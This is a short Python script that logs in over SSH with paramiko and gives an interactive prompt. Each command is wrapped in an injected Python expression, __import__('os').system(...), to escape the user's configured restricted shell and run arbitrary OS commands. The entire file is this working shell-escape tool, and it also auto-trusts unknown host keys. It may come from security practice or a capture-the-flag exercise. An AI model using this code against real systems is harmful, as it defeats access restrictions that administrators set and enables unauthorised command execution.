#!/bin/python3

import sys
import argparse
import paramiko
from getpass import getpass

def main():

    #Parse command-line arguments
    parser = argparse.ArgumentParser(description="Connects via SSH and trys to emulate a shell, bypassing the given user's configured shell.")
    parser.add_argument("host", help="The host to connect to", type = str )
    parser.add_argument("-p", "--port", help="The port to connect to", type = int )
    parser.add_argument("-u", "--user", help="The username to use" , type = str)
    parser.add_argument("-pwd", "--password", help="The password to use", type = str )

    args = parser.parse_args()

    user = args.user
    password = args.password
    host = args.host
    port = args.port

    #Validate aruments
    if port is None:
        port=22
    if user is None:
        user=input("Username: ").strip()
    if password is None:
        password=getpass("Password ({}@{}:{}): ".format(user,host,port)).strip()

    #Connect to SSH
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, port, user, password)

    while True:

        #Prompt
        cmd = input("$ ")\
            .strip()\
            .replace("'", r"\'")\
            .replace(" ",r"\t")

        if len(cmd)==0:
            continue

        if (cmd[0]=="/"):
            print("Binaries are not supported.")
            continue

        if cmd=="exit":
            sys.exit(0)

        #Execute Command
        cmd = "echo __import__('os').system('{}')".format(cmd)
        (stdin,stdout,stderr) = ssh.exec_command(cmd)
        out = stdout.read()\
            .decode(sys.stdout.encoding)
        print (out.strip())

    #Close SSH
    ssh.close()


if __name__ == '__main__':
    main();

